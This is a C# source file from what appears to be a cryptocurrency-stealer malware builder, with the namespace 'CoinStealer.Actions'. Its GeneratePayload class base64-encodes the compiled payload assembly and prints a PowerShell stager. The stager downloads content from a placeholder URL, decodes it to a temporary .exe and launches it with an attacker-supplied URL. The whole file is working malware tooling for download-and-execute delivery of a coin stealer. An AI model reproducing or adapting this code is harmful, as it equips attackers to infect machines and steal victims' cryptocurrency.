using System;
using System.IO;

namespace CoinStealer.Actions
{
    /// <summary>
    /// Generate a PS payload
    /// </summary>
    public class GeneratePayload
    {
        public static void Run(string url)
        {
            string source = "";

            Type dummy = typeof(CoinPayload.Program);

            #region Source
            Console.ForegroundColor = ConsoleColor.Yellow;

            source = Convert.ToBase64String(File.ReadAllBytes(dummy.Assembly.Location));
            Console.WriteLine(source);
            #endregion

            #region PS
            Console.ForegroundColor = ConsoleColor.Cyan;
            source =
@"
$source = (Invoke-WebRequest -Uri ""http://change-me-for-your-download-url.com"" -UseBasicParsing).Content.Trim();
$source=[System.Convert]::FromBase64String($source);
$file=[System.IO.Path]::GetTempFileName();
[System.IO.File]::WriteAllBytes($file,$source);
Rename-Item -Path $file -NewName ($file+'.exe');
[System.Diagnostics.Process]::Start($file+'.exe','" + url + @"');
";
            Console.WriteLine(source);
            #endregion
        }
    }
}